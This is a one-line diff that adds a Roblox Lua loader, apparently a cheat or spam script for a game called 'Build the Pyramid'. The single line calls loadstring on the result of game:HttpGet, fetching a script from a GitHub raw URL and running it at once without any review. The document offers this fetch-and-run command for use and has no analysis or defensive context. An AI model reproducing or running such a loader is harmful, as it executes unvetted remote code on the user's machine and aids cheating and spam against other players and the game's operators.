@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/build-the-pyramid-spam6-5x1ht9edhw3bc2.lua"))()
